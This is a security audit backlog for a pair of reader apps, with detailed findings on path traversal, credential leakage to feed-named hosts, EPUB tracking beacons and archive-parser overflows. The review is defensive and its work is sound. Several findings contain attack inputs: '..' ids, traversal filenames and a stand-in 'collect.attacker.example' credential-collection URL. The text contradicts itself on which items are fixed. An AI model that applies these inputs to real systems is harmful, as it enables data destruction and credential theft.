# Security review — 30 August 2026

A read-only audit of both apps, run while the round-4 feature agents were building.
This is the backlog, worked through in rank order.

**Rank 1 is fixed** — see the commit that follows this document. Every other finding
below is still open.

## How this was produced, and how much to trust it

Six lenses ran in parallel over the tree — dependency advisories, credential handling,
publication parsing, network and transport, WebView and external content, and the
device-local surface. Every finding was then handed to a **separate agent instructed to
refute it**, defaulting to REFUTED and empowered to correct severity downward. 27 findings
survived that pass; merging duplicates across lenses left the 21 below.

Each entry carries a verdict:

- **CONFIRMED** — the refuting agent read the code and could not make the finding go away.
- **UNPROVEN** — the concern is legitimate but reachability could not be settled from
  source alone. Kept deliberately rather than dropped, and labelled so nobody mistakes it
  for a confirmed defect.

Four feature agents were building concurrently, so the audit was barred from running
Gradle, `swift build`, or `swift test`. Anything that needed a build or a device is named
as such at the end.

### Threat model this was judged against

No backend, no accounts, no analytics — so the realistic attackers are:

1. **A malicious publication file** (CBZ/CBR/EPUB/PDF) the reader opens. Primary surface.
2. **A hostile or compromised configured server** — OPDS, Kavita, SMB.
3. **Another app on the same device.**
4. **Someone holding the unlocked device, or a backup of it.**

Findings that need a backend to matter — SQL injection against a server, CSRF, session
fixation — were ruled out of scope rather than padded into the list.

## Finding 1 is confirmed by hand, not just by agents

Rank 1 is a data-destroying bug reachable from one tap, so I reproduced it myself rather
than relaying it. `safe()` permits `.` in its character class on both platforms, so an id
of `..` passes through completely untouched, and both `remove()` implementations feed the
result straight into a recursive delete.

Running the real iOS sanitiser and `FileManager.removeItem` against a sandbox tree:

```
safe("..") = ".."   <- unchanged? true
delete target .path = .../AppSupport/Downloads/..
UNRELATED DATA DESTROYED
```

The unrelated sibling directory was gone. On the JVM the same shape holds — `listFiles()`
on `downloads/..` enumerates the *parent's* children, which is exactly what Kotlin's
`deleteRecursively()` walks:

```
safe("..") = ".."  unchanged? true
target = jt/files/downloads/..
listFiles() sees 2 entries -- these are the PARENT's children:
    OtherData
    downloads
```

And the id really is attacker-controlled with no validation in between: the OPDS `<id>`
element lands in `entry.id`, which is handed to `Download(id:)` verbatim on both platforms.
A grep for `standardized`, `canonicalPath`, or `resolvingSymlinks` across both persistence
trees returns nothing.

Worth saying plainly: **I edited this exact function earlier in this session** — the
download-naming fix — read `safe()`, and did not spot it. The audit did.

## The list

| # | Sev | Finding | Platform | Kind | Effort |
|---|-----|---------|----------|------|--------|
| 1 | 🔴 critical | A catalogue-supplied download id of ".." escapes the downloads directory | both | our-code | small |
| 2 | 🟠 high | The OPDS credential is attached to whatever URL the feed names, with no origin check,… | both | our-code | medium |
| 3 | 🟠 high | A publication's remote subresources and scripts run unrestricted in the EPUB WebView | both | configuration | needs-a-decision |
| 4 | 🟠 high | Vendored libarchive is pinned at 3.8.1, missing nine upstream RAR/RAR5 memory-safety… | both | dependency | medium |
| 5 | 🟡 medium | iOS | ios | our-code | small |
| 6 | 🟡 medium | A hostile SMB server picks both the destination and the content | both | our-code | small |
| 7 | 🟡 medium | A Kavita OPDS URL pasted into the generic catalogue sheet writes the full-privilege API… | both | our-code | small |
| 8 | 🟡 medium | "Remove source" is a no-op for every server source and never deletes the stored secret | both | our-code | small |
| 9 | 🟡 medium | Android | android | our-code | small |
| 10 | 🟡 medium | Android permits cleartext to every host app-wide, and the config's own stated… | android | configuration | small |
| 11 | 🟡 medium | iOS SMB responses are never signature-verified, and the client signs only when the… | ios | dependency | needs-a-decision |
| 12 | ⚪ low | iOS RAR entry decompression has no size ceiling, contradicting the 512 MB cap… | ios | our-code | small |
| 13 | 🟡 medium | No committed lockfile governs the iOS app binary | ios | process | small |
| 14 | ⚪ low | A publication's external link URL is handed to the OS with no scheme allow-list and no… | both | our-code | small |
| 15 | ⚪ low | Kavita connections sit outside the certificate-pinning story on both platforms, and the… | both | our-code | small |
| 16 | ⚪ low | Android SMB signing is neither requested nor reported, so a NAS that merely supports… | android | configuration | small |
| 17 | ⚪ low | BouncyCastle 1.76 ships transitively via jcifs-ng and parses server-controlled SPNEGO… | android | dependency | small |
| 18 | · informational | No file-protection class is set on any iOS data the app writes, so downloads, covers… | ios | our-code | small |
| 19 | · informational | "Clear cache" does not touch web-view cookies or origin storage, and the user-facing… | both | our-code | small |
| 20 | · informational | marmelroy/Zip 2.1.2 is linked into the iOS binary carrying an unfixable path-traversal… | ios | dependency | small |
| 21 | · informational | jsoup 1.22.2 falls inside the CVE-2026-71497 range, but the advisory exempts built-in… | android | dependency | small |

---

## Detail

### 1. FIXED — A catalogue-supplied download id of ".." escapes the downloads directory: the failure path then recursively deletes every offline publication, and the success path writes attacker bytes outside the managed tree

**🔴 critical** · both · our-code · effort: small · **CONFIRMED**

**What goes wrong.** A reader adds a hostile or compromised OPDS catalogue (threat-model actor 2) and taps Download on an entry whose `<id>` is exactly `..` — invisible in the UI, which shows only the title. The server then drops the connection, `fail()` runs `store.remove(download)`, and the app recursively deletes `<filesDir>/downloads/..`: on Android every offline publication and every imported copy, on iOS all of Application Support including the SwiftData store holding reading progress, bookmarks and annotations. Cancelling the download reaches the same code. Irreversible local data loss from one tap, no confirmation, nothing in the UI that would let the reader see it coming.

**Fix.** One line in each `safe()`, which is the single choke point for both the write and the delete: after the character replacement, map a result that is `.`, `..`, empty or all-dots to a placeholder — or better, mirror `CoverCache.file(for:)` and key the directory on a hash of the raw id. Harden alongside: have `remove()` verify the resolved path is still inside `directory` (`File.canonicalPath.startsWith` / `URL.standardized` prefix check) before the recursive delete, so a future sanitiser gap cannot become a recursive delete again. Add `..`, `.` and `..%2f` cases to DownloadStoreTests.namesAreMadeSafe and DownloadLocationTest.

**Evidence.**

- apps/ios/Packages/StoryArcKit/Sources/Persistence/DownloadStore.swift:93 — `text.replacing(#/[^A-Za-z0-9._ -]/#, with: "-")`. `.` is inside the allowed class, so `..` needs no separator and passes through untouched. The doc comment above it at :92 claims 'no separators, nothing that reads as a path'.
- apps/android/core/persistence/src/main/kotlin/app/storyarc/core/persistence/DownloadStore.kt:118 — `text.replace(Regex("[^A-Za-z0-9._ -]"), "-")`, character-for-character the same rule.
- apps/android/core/persistence/.../DownloadStore.kt:98 — `File(directory, safe(download.id)).deleteRecursively()`; with id `..` this is `<filesDir>/downloads/..`, and Kotlin's walkBottomUp/listFiles resolves it through the kernel, unlinking everything under filesDir.
- apps/ios/Packages/StoryArcKit/Sources/Persistence/DownloadStore.swift:71-75 — `FileManager.default.removeItem(at: directory.appending(path: Self.safe(download.id), directoryHint: .isDirectory))`. The parsers verifier ran this against a sandbox tree: `.appending(path:)` left `..` in `.path`, and `removeItem` deleted the entire parent including an unrelated sibling directory.
- apps/ios/Packages/StoryArcKit/Sources/Persistence/DownloadStore.swift:20-21 — `directory` is `URL.applicationSupportDirectory.appending(path: "Downloads")`, so one level up is Application Support, which also holds SwiftData's default store (ProgressStore.swift:73-79 passes a bare `ModelConfiguration()`): reading progress, bookmarks and annotations are in the blast radius.
- The id is attacker-controlled with no validation: apps/ios/Packages/StoryArcKit/Sources/Catalogue/OpdsAtom.swift:120-121 `case "id": entry?.id = value` takes the raw Atom `<id>` text, and :237 falls back to the raw title. Android mirror: apps/android/core/catalogue/.../OpdsAtom.kt:109 and :244.
- apps/ios/Packages/StoryArcKit/Sources/LibraryFeature/DownloadQueue.swift:138-139 `Download(id: entry.id, ...)` and apps/android/feature/library/.../DownloadQueue.kt:92-93 `id = entry.id` carry it through unsanitised.
- No deliberate delete is needed: apps/android/.../DownloadQueue.kt:288-290 `fail()` calls `store?.remove(download)` on ANY download failure; apps/ios/.../DownloadQueue.swift:334-338 does the same; DownloadQueue.kt:163 and DownloadQueue.swift:206 reach it from cancel/remove too.
- The success path escapes too: DownloadStore.kt:85 `File(File(directory, safe(id)), "$stem.$extension")` writes to `<filesDir>/<title>.cbz`, which is outside the only backup exclusion (apps/android/app/src/main/res/xml/data_extraction_rules.xml:4 `<exclude domain="file" path="downloads/" />`), not counted by `bytesOnDisk()` (DownloadStore.kt:141) and not removed by `reset()` (DownloadStore.kt:159-162).
- The project already solves this correctly one directory away: apps/ios/Packages/StoryArcKit/Sources/Formats/CoverCache.swift:44-51 hashes the id, with the comment 'A publication id can carry a path, and a path carries separators'.
- Test gap: apps/ios/Packages/StoryArcKit/Tests/PersistenceTests/DownloadStoreTests.swift:100-107 exercises `urn:uuid:1/2 3` and asserts only that `/` is removed; grep for `..` in apps/android/core/persistence/src/test/.../DownloadLocationTest.kt returns nothing.
- No mitigation exists: grep for canonicalPath / .standardized / resolvingSymlinks across apps/android/core, apps/android/feature and both iOS Sources trees hits only ImageFolderArchive, an unrelated subsystem.


### 2. FIXED — The OPDS credential is attached to whatever URL the feed names, with no origin check, so a compromised catalogue collects the reader's Basic password — and the cover path fires with no tap

**🟠 high** · both · our-code · effort: medium · **CONFIRMED**

**What goes wrong.** A reader signs in to their catalogue with HTTP Basic. The catalogue is an aggregator, has one attacker-influenced metadata field, or is later compromised. It returns an entry whose cover or acquisition link points at `http://collect.attacker.example/x`. Both platforms set `Authorization: Basic base64(user:password)` on that request because the credential closure ignores the target. The attacker's host receives the reader's catalogue password in the first request line — on Android in cleartext, since the base-config permits it (see rank 10). The cover variant needs no interaction at all: it fires as the browse grid scrolls.

**Fix.** Carry the configured source's origin (scheme, host, port) beside the credential and attach `Authorization` only when the request URL's origin matches — one guard in `OpdsClient.fetch` on both platforms, so a feed-supplied href to any other origin goes out anonymous. Add the redirect hook that drops the header when the host changes (`urlSession(_:task:willPerformHTTPRedirection:)` on iOS; on Android set `instanceFollowRedirects = false` and re-issue through the same origin check). Add a cross-host redirect test to both suites.

**Evidence.**

- apps/ios/Packages/StoryArcKit/Sources/LibraryFeature/DownloadQueue.swift:266-268 — `var request = URLRequest(url: download.remote)` then `request.setValue(credential.header, forHTTPHeaderField: "Authorization")`; nothing compares `download.remote`'s host with the source's host.
- apps/ios/Packages/StoryArcKit/Sources/LibraryFeature/DownloadQueue.swift:141 — `remote: acquisition.href`, the href verbatim out of the feed.
- apps/ios/Packages/StoryArcKit/Sources/LibraryFeature/CatalogueBrowserView.swift:54 — literally `credential: { _ in credential }`: the closure discards the download id and returns the page's credential for every target.
- apps/ios/Packages/StoryArcKit/Sources/LibraryFeature/CatalogueEntryCell.swift:126-127 — `client.data(at: url, credential: credential)` with `url = entry.thumbnail ?? entry.cover`, both server-supplied. Called from `loadCover()`, so this fires unattended as the grid scrolls — no tap required.
- apps/ios/Packages/StoryArcKit/Sources/Catalogue/OpdsDocument.swift:53-55 — `resolve` is `URL(string: href, relativeTo: base)?.absoluteURL`; an absolute href simply replaces the base and no scheme/host check follows. Kotlin mirror at OpdsDocument.kt:79-81.
- apps/android/feature/library/.../DownloadQueue.kt:257 `client.bytes(download.remote, credential(download.id))` with `remote = acquisition.href` at :95.
- apps/android/app/src/main/kotlin/app/storyarc/MainActivity.kt:594-598 — `DownloadQueue(..., credential = { page.credential })`, again ignoring which download is being fetched.
- apps/android/core/catalogue/.../OpdsClient.kt:135 — `credential?.let { connection.setRequestProperty("Authorization", it.header) }` on whatever URL `fetch` was handed (read directly: the header is set before any trust or scheme handling).
- apps/android/feature/library/.../CatalogueBrowser.kt:141 — `client.feed(url, credential)` is also called with `next` (:100/:105), a URL the server chose.
- Redirects are unhandled: grep for `willPerformHTTPRedirection`, `instanceFollowRedirects`, `followRedirects` across apps/ios/Packages/*/Sources, apps/ios/App and apps/android/{app,core,feature} returns nothing, so whether the Authorization header survives a cross-host 302 is left to the platform default and untested — the only redirect test, apps/android/core/catalogue/src/test/.../OpdsClientTest.kt:104-123, is same-host.
- docs/openspec/specs/settings-and-about/spec.md:53 — 'data leaves the device only to the sources the user configured'.


### 3. A publication's remote subresources and scripts run unrestricted in the EPUB WebView — no CSP, no allow-list, no scripting switch — so a crafted book beacons home on first render with zero interaction

**🟠 high** · both · configuration · effort: needs-a-decision · **CONFIRMED**

**What goes wrong.** A reader opens an EPUB from a download, a share sheet, or an OPDS catalogue. One chapter contains `<img src="https://track.example/p.png?b=9f2&c=4" width="1" height="1">`. Nothing is tapped. On first render of that chapter the web view issues the request, disclosing the device IP, the exact time of reading and — through the URL the publication author chose — which book and which chapter, to a host the reader never configured. Reopening the book on later evenings builds a reading timeline keyed to that IP. Publication JavaScript does it more precisely with `fetch()` on every page turn. This is the app's headline privacy promise defeated with no user interaction.

**Fix.** Deny by default for publication content. iOS: compile a `WKContentRuleList` blocking every load whose URL is not the `readium` scheme and add it to the `WKWebViewConfiguration.userContentController` the EPUB navigator uses; set `defaultWebpagePreferences.allowsContentJavaScript = false` unless scripted EPUBs are a requirement. Android: intercept before Readium's `WebViewAssetLoader` and return an empty `WebResourceResponse` for any request whose host is neither `readium_package` nor `readium_assets`. If neither hook is reachable without patching Readium, inject `<meta http-equiv="Content-Security-Policy" content="default-src 'self' data:; connect-src 'none'">` into each served HTML resource. If remote content is ever wanted, make it an explicit Privacy-screen setting, off by default — and amend SECURITY.md:37 to say network egress is in scope.

**Evidence.**

- apps/ios/Packages/StoryArcEpub/.build/checkouts/swift-toolkit/Sources/Navigator/EPUB/EPUBSpreadView.swift:74-75 — a bare `WKWebViewConfiguration()` with exactly one scheme handler registered (`config.setURLSchemeHandler(viewModel.server, forURLScheme: viewModel.server.scheme)`). Only that scheme is intercepted; every other URL in the document is loaded over the network as normal. `defaultWebpagePreferences.allowsContentJavaScript` is never set.
- EPUBNavigatorViewModel.swift:55 and :76 — the scheme is `readium` and the publication is served at `readium://<UUID>/`.
- EPUBSpreadView.swift:651-666 — `var policy: WKNavigationActionPolicy = .allow`; only `navigationType == .linkActivated` is ever cancelled, so subresource loads (img/css/font/fetch) are never inspected.
- EPUBSpreadView.swift:300-311 — the toolkit's own comment names the case: 'External URLs (http://) or already-relative URLs fall back to the raw value' and 'For resources not in the manifest (e.g. external http:// images) we synthesise a plain Link.'
- readium-navigator-3.3.0.aar, constant pool of `org/readium/r2/navigator/pager/R2EpubPageFragment.class` — contains `setJavaScriptEnabled` and `addJavascriptInterface`: publication JavaScript executes on Android, so `fetch()` / `new Image().src` are available to the book on every page turn.
- The app narrows none of it: apps/ios/Packages/StoryArcEpub/Sources/EpubReaderFeature/EpubReaderOpening.swift:62-68 passes only `fontFamilyDeclarations`; apps/android/feature/epubreader/.../EpubReaderActivity.kt:400-410 passes only `declareBundledFonts()` and `selectionActionModeCallback`.
- No sanitisation step exists between the ZIP entry and the WebView: apps/ios/Packages/StoryArcKit/Sources/Formats/EpubReader.swift and apps/android/core/format/.../EpubReader.kt parse structure only.
- apps/android/app/src/main/res/xml/network_security_config.xml:25-31 — `<base-config cleartextTrafficPermitted="true">` app-wide, so on Android the beacon also works over plaintext `http://`.
- The promise it breaks: README.md:390 'no telemetry of any kind. Data leaves your device only to the servers you configured yourself'; docs/openspec/specs/settings-and-about/spec.md:52; AGENTS.md section 2 non-negotiable 2. SECURITY.md:37 claims a 'restricted context' but does not list network egress among what is restricted.
- Provenance: the swift-toolkit checkout is pristine upstream 3.11.0 (Package.resolved revision d82f44f, git log in the checkout shows only the 3.11.0 tag commit) — this is dependency default behaviour the app fails to configure, not modified vendor code.


### 4. Vendored libarchive is pinned at 3.8.1, missing nine upstream RAR/RAR5 memory-safety fixes and a read-framework integer-overflow fix, on the one C parser that sees every CBR the reader opens

**🟠 high** · both · dependency · effort: medium · **CONFIRMED**

**What goes wrong.** A reader opens a crafted CBR from a download, a share sheet, an OPDS/Kavita catalogue or an SMB share. The RAR VM bytecode block encodes a 32-bit `staticdatalen`; `compile_program` mallocs up to 4 GB and fills it a byte at a time, so the app is killed for memory pressure or hangs on both platforms with no user action beyond opening the file. The same untrusted bytes also reach the RAR5 decode-table builder with no over-subscription check and the `bytes_remaining` signed underflow — classes upstream fixed as memory-safety issues, in C, in-process, on the app's primary attack surface. Because the pin is invisible to every dependency scanner, the next RAR advisory will not reach this repo at all.

**Fix.** Refresh the vendored copy to libarchive 3.8.9 following third_party/libarchive/VENDORING.md's own procedure (re-copy the 26 sources plus headers, re-derive config.h from the new config.h.in, bump ARCHIVE_VERSION_* and the version in VENDORING.md). Then make the pin machine-checkable: record the version and tarball digest in a file CI reads, and add a job that fails when it falls behind the latest libarchive tag or when a new advisory touches the RAR readers — the manual step in VENDORING.md needs an alarm attached to it, because no scanner will ever raise one.

**Evidence.**

- third_party/libarchive/Sources/CLibarchive/config.h:24-26 — `ARCHIVE_VERSION_ONLY_STRING "3.8.1"` / `ARCHIVE_VERSION_NUMBER 3008001`. Confirmed again at include/archive.h:37,180. Upstream is at 3.8.9; v3.8.2 through v3.8.9 all shipped after the pin.
- archive_read_support_format_rar.c:3554-3555 — verbatim `prog->staticdatalen = membr_next_rarvm_number(&br) + 1; prog->staticdata = malloc(prog->staticdatalen);` with no VM_MEMORY_SIZE guard (VM_MEMORY_SIZE is defined at :139 and used at :3326 and :3483, never before this malloc). Upstream PR #3105 (in 3.8.8) adds `if (staticdatalen >= VM_MEMORY_SIZE) { delete_program_code(prog); return NULL; }`.
- Unboundedness verified, not assumed: membr_next_rarvm_number (:3602-3618) has a `default: return membr_bits(br, 32)` arm, so the value reaches ~4 GB, and the fill loop at :3565-3566 touches every byte, committing it.
- Reachability proven: compile_program is called at :3349 from the RAR3 filter parser during entry decompression; apps/ios/Packages/StoryArcKit/Sources/Formats/RarDecoder.swift:126-127 registers `archive_read_support_format_rar` and `_rar5` on every CBR open; apps/android/core/format/src/main/cpp/CMakeLists.txt:18-35 globs the same directory, so both apps ship the same stale parser.
- archive_read_support_format_rar5.c:2589-2596 — `create_decode_tables` ends its loop at `upper_limit <<= 1;` with no rejection; upstream PR #3004 ('[RAR5] FAIL if the decode table is > 2^16', in 3.8.8) inserts `if(upper_limit > 65536) return ARCHIVE_FAILED;` right there. Absent here.
- archive_read.c:1368 — pre-fix pointer arithmetic `filter->next + min > filter->buffer + filter->buffer_size`, replaced upstream by PR #3083 with `min > filter->buffer_size - (filter->next - filter->buffer)`. This function is on every read, not only RAR.
- v3.8.8 release notes list under RAR reader: NEWSUB extended-data read (#3015), NEWSUB payloads without size cap (#3047), low-distance state reset for new LZ tables (#3048), staticdata bound check (#3105); under RARv5: decode table > 2^16 (#3004), unconsumed block bytes before ARCHIVE_RETRY (#3091), signed integer underflow in bytes_remaining (#3121). v3.8.6 adds an rar5 infinite-loop fix (#2877) and a memory leak (#2892); v3.8.7 an LZSS window size mismatch after a PPMd block (#2898); v3.8.2 multiple rar5 extra-field parsing issues (#2713).
- CVE-2025-5915 (GHSA-6vpf-5947-22g5, `copy_from_lzss_window`, present at rar.c:3146) is patched in 3.8.0 and therefore does NOT affect this pin — checked and cleared.
- third_party/libarchive/VENDORING.md:32 and :110-112 — the repo's own warning: 'CVE tracking is manual', 'vulnerability alerts will not find them automatically', 'treat a RAR-reader CVE as urgent: those two files parse untrusted input from the internet'. Echoed at SECURITY.md:35. git log shows the sources landed 2026-08-24 and have not moved since.


### 5. FIXED — iOS: Int64 overflow on attacker-controlled ZIP64/TAR header fields traps the process, so one crafted CBZ in a watched folder crashes the app on every launch

**🟡 medium** · ios · our-code · effort: small · **CONFIRMED**

**What goes wrong.** A CBZ reaches a watched library folder via Files, AirDrop, a share sheet, or a configured catalogue. Its last 64 KB contains the Zip64 locator signature followed by an 8-byte offset near `Int64.max`. On the next scan `ZipReader.init` reaches `readZip64`, `recordOffset + 56` overflows, and Swift traps — an uncatchable process abort, not a thrown `ZipError`. Because the scan re-runs on every launch, the app crashes at start until the reader works out which file to remove. The same trap class is reachable through a Zip64 extra field on a central-directory entry and through a GNU base-256 size field in a CBT.

**Fix.** Range-check every value returned by `Int64(bitPattern:)` or a base-256 size field at the point of parse — reject anything negative or greater than `source.length` there — and use `addingReportingOverflow` / `subtractingReportingOverflow` in the bounds guards themselves (ZipReader.swift:95, :310, :321; ZipCentralDirectory.swift:129; TarReader.swift:77-78, which also needs the `guard size >= 0` moved above the arithmetic) so a lying header throws `ZipError.malformed` the way Android's already does.

**Evidence.**

- apps/ios/Packages/StoryArcKit/Sources/Formats/ZipCentralDirectory.swift:127-131 — `let recordOffset = Int64(bitPattern: try locator.uint64())` then `guard recordOffset >= 0, recordOffset + 56 <= source.length`. Read directly: an offset of `0x7FFFFFFFFFFFFFC8` passes the first clause and traps on the addition before the comparison. Swift's signed-overflow trap is not a catchable error.
- apps/ios/Packages/StoryArcKit/Sources/Formats/ZipReader.swift:85-86 — `if needsZip64 || Self.lastIndex(of: Self.zip64LocatorSignature, in: tail) != nil { ... readZip64 ... }`. The Zip64 path runs whenever the four bytes `50 4B 06 07` appear anywhere in the last 64 KB, so nothing else about the archive has to be malformed.
- ZipReader.swift:95 — `guard cdOffset >= 0, cdSize >= 0, cdOffset + cdSize <= source.length`; both operands come from `Int64(bitPattern:)` at ZipCentralDirectory.swift:147-149, and two large positives overflow the sum.
- ZipCentralDirectory.swift:103-106 — `localHeaderOffset` is overridden from the Zip64 extra field via `Int64(bitPattern: try reader.uint64())` with no range check, stored verbatim at :55, then used at ZipReader.swift:310 as `count: min(30, Int(source.length - entry.localHeaderOffset))` — `length - Int64.min` overflows. ZipReader.swift:321 has the same shape for `dataOffset + entry.compressedSize`.
- apps/ios/Packages/StoryArcKit/Sources/Formats/TarReader.swift:78 — `offset += (size + Int64(Self.blockSize) - 1) / ...` executes on the line BEFORE the `guard size >= 0` on :79, and `size(of:)`'s GNU base-256 branch (:157-163) guards `value < Int64.max >> 8` before the shift, so the final value reaches Int64.max.
- Reachable from the routine folder scan: apps/ios/Packages/StoryArcKit/Sources/Formats/ComicArchive.swift:88-90 `ZipComicArchive.init` calls `ZipReader(source:)`, and PublicationIndexer.swift:189 is what LibraryScanner.swift:265 runs over every file it walks. The cache short-circuit never engages for a file whose index never completed, so it re-crashes on every scan.
- apps/android/core/format/src/main/kotlin/app/storyarc/core/format/ZipReader.kt:107 and :234 — the mirrored expressions; Kotlin wraps silently and RandomAccessSource.kt:45 (`if (offset < 0 || count < 0 || offset + count > length)`) rejects the wrapped negative, so Android degrades to an exception.


### 6. FIXED — A hostile SMB server picks both the destination and the content: an unfiltered share entry name writes outside the app's cache directory

**🟡 medium** · both · our-code · effort: small · **CONFIRMED**

**What goes wrong.** The reader browses a share on a hostile or compromised SMB server and taps a file whose listed name is `../../Preferences/group.app.storyarc.plist` (or on Android `../shared_prefs/settings.xml`). The indexer refuses to stream that format, so the app writes the server's bytes to `Caches/Smb/<name>`, which the kernel resolves out of the cache directory and into the app's own preferences. The server controls both the path and the content, so it can overwrite persisted app configuration inside the sandbox.

**Fix.** Take only the last path component of a share entry name before it is used as a filename, and reject any name that is `.`, `..`, empty, or still contains a separator after decoding — the same normalisation `ImageFolderArchive.data(for:)` already applies to publication-internal paths. Filtering `.`/`..` in `SmbClient.list` is not the right place; the sanitisation belongs where the name becomes a path.

**Evidence.**

- apps/ios/Packages/StoryArcKit/Sources/LibraryFeature/SmbBrowserView.swift:146-152 — read directly: `let directory = URL.cachesDirectory.appending(path: "Smb", directoryHint: .isDirectory)`, then `let local = directory.appending(path: entry.name)`, then `try await source.read(offset: 0, count: Int(entry.length)).write(to: local, options: .atomic)`. `entry.name` is not sanitised.
- SmbBrowserView.swift:141-145 — the branch is taken when `catalogued.streaming == .refused`, i.e. any format needing a local file (PDF, solid RAR, CB7). The server chooses what it serves, so it chooses whether this branch runs.
- apps/ios/Packages/StoryArcKit/Sources/Smb/SmbClient.swift:68 — the listing filters only exact matches: `.filter { $0.name != "." && $0.name != ".." }`. `../../Preferences/x.plist` is not an exact match and survives.
- apps/ios/Packages/StoryArcKit/.build/checkouts/SMBClient/Sources/SMBClient/SMBClient.swift:285-288 — `name = fileInfo.fileName` straight from the QUERY_DIRECTORY response; `listDirectory` (:76-79) normalises only the request path, never the returned names. No sanitisation anywhere below the app either.
- apps/android/feature/library/.../SmbBrowserScreen.kt:241-246 — `File(context.cacheDir, "smb")` then `File(directory, entry.name).apply { ... writeBytes(source.read(0, entry.length.toInt())) }`.
- apps/android/core/smb/.../SmbClient.kt:89-97 — `val name = each.name.trimEnd('/')`, with no dot-segment filter at all on the Android side.
- The project's own stated rule, applied elsewhere: apps/ios/Packages/StoryArcKit/Sources/Formats/CoverCache.swift:44-45 'a file name is not a place to find that out'.


### 7. FIXED — A Kavita OPDS URL pasted into the generic catalogue sheet writes the full-privilege API key into plaintext preferences and, on Android, into cloud backup

**🟡 medium** · both · our-code · effort: small · **CONFIRMED**

**What goes wrong.** A reader copies the OPDS URL out of Kavita's own settings screen and pastes it into 'Add catalogue' — the natural destination for an OPDS URL. Nothing recognises it as a Kavita URL, and because the path segment IS the credential the feed fetch succeeds with no 401 and no prompt for a secret, so `credentialReference` stays nil and CredentialStore is bypassed entirely. The key-bearing locator is JSON-encoded into UserDefaults / SharedPreferences in plaintext, readable from an unencrypted device backup, from an adb-backup-style extraction, and on Android from Google cloud backup and device-to-device transfer — none of which the Keychain/Keystore-held secrets are exposed to. A Kavita API key is not read-only: it mints session tokens via `Plugin/authenticate`, so whoever recovers it holds the reader's Kavita account.

**Fix.** Divert the paste before it becomes an OPDS source: in `CatalogueConnection.connect()` on both platforms call `KavitaAddress.fromOpds(address)` first and, on a match, either hand the flow to the Kavita path or refuse with a message pointing at the Kavita sheet. As defence in depth for catalogues generally, reject or strip a locator that still carries userinfo or a `/api/opds/<key>` segment and move any such secret into CredentialStore. Separately add `<exclude domain="sharedpref" path="app.storyarc.sources.xml"/>` to both data_extraction_rules.xml and backup_rules.xml.

**Evidence.**

- apps/ios/Packages/StoryArcKit/Sources/Kavita/KavitaAddress.swift:21-27 — the code's own doc: Kavita's OPDS URL is `https://host/api/opds/<key>` and 'that key is the same one its settings screen shows'. The full-privilege user API key is the path segment.
- KavitaAddress.swift:31 — `fromOpds` exists precisely to split that URL into a key-free `base` plus `apiKey`. Its only production callers are apps/ios/.../LibraryFeature/KavitaConnection.swift:34,43,57 and apps/android/.../KavitaConnection.kt:57,62. A repo-wide grep for `fromOpds` returns no hit inside either CatalogueConnection — the catalogue flow has no such diversion on either platform.
- apps/ios/Packages/StoryArcKit/Sources/Catalogue/OpdsDocument.swift:42-49 — `address(from:)` completes the typed string to a URL with path and query intact; nothing strips `/api/opds/<key>`.
- apps/ios/Packages/StoryArcKit/Sources/LibraryFeature/CatalogueConnection.swift:153 — the saved source is built with `locator: url.absoluteString`, the whole key-bearing URL. Android mirror: apps/android/feature/library/.../CatalogueConnection.kt:164 `locator = url`.
- apps/ios/Packages/StoryArcKit/Sources/Persistence/SourceStore.swift:31-33 and :54 — `save` JSON-encodes the registry (`StoredRegistry.Entry` carries `let locator: String?`) and writes it with `defaults.set(data, forKey:)` into UserDefaults in the clear.
- apps/android/core/persistence/.../SourceStore.kt:30,42-46 — a plain `SharedPreferences` in MODE_PRIVATE (not EncryptedSharedPreferences), same JSON, `putString`.
- apps/android/app/src/main/AndroidManifest.xml:15-17 — `android:allowBackup="true"` with dataExtractionRules/fullBackupContent; res/xml/data_extraction_rules.xml:3-9 and res/xml/backup_rules.xml exclude only `domain="file"` paths `downloads/` and `cache/`. The `sharedpref` domain holding `app.storyarc.sources.xml` is in the cloud-backup and device-transfer set.
- The spec forbids exactly this: docs/openspec/specs/sources/spec.md:45-47 'SHALL NOT write a secret to preferences, logs, crash reports, backups'. And the field's own comment asserts the opposite of what happens: apps/ios/Packages/StoryArcKit/Sources/StoryArcCore/Source.swift:55-57 'Opaque handle into the platform secure store. Never the secret itself.'


### 8. FIXED — "Remove source" is a no-op for every server source and never deletes the stored secret — CredentialStore.remove() has no production caller on either platform

**🟡 medium** · both · our-code · effort: small · **CONFIRMED**

**What goes wrong.** A reader adds a Kavita server or an SMB share, later decides to disconnect it, uses Remove in Settings and confirms the dialog. Nothing happens: the source is not removed from the registry, the app keeps using the credential to reach the server, and the API key or share password stays in the Keychain / Keystore-encrypted preferences indefinitely with nothing in the app that will ever reference or clear it. Anyone who later holds the unlocked device still has a working credential for a server the reader believes was disconnected, and on Android the orphaned ciphertext rides along in every cloud backup with no owning source to explain it. The secret never leaves the secure store, which is what keeps this below rank 7.

**Fix.** Delete the secret before dropping the source: call `credentials.remove(source.credentialReference)` — the stored reference, not one re-derived from `source.id` — in `LibrarySources.remove(_:)` and `LibraryViewModel.removeSource(...)`. Move the folder lookup below that so it stops gating server sources, and give non-folder sources a real removal branch that tombstones the registry entry. Separately pass `id: id` in `KavitaConnection.source()` on iOS so the identifier and its credential reference agree.

**Evidence.**

- apps/ios/Packages/StoryArcKit/Sources/Persistence/CredentialStore.swift:80 and apps/android/core/persistence/.../CredentialStore.kt:151 — `remove(_:)` documented as 'Called when a source is removed… a secret outliving the source it belonged to is a secret nobody will ever look for again.'
- Repo-wide grep for a credential-store `.remove(` outside the store itself matches only apps/ios/Packages/StoryArcKit/Tests/PersistenceTests/CredentialStoreTests.swift (27, 47, 58, 66, 78, 91, 96) and apps/android/core/persistence/src/androidTest/.../CredentialStoreTest.kt (35, 71, 79, 99). Every production construction/use site (LibrarySources.swift:283, LibraryView.swift:59,61,93,98, LibrarySourceHealth.swift:86, ShelvesView.swift:133) calls something else.
- apps/ios/Packages/StoryArcKit/Sources/LibraryFeature/LibrarySources.swift:140-141 — `guard let folder = folders.first(where: { $0.lastPathComponent == source.locator }) else { return }` sits BEFORE anything touching the registry, so a Kavita/OPDS/SMB source falls straight out of the function.
- apps/android/feature/library/.../LibraryViewModel.kt:521-523 — `val tree = _folders.value.firstOrNull { it.toString() == source.locator } ?: return`, the same folder-only guard, then delegates to removeFolder.
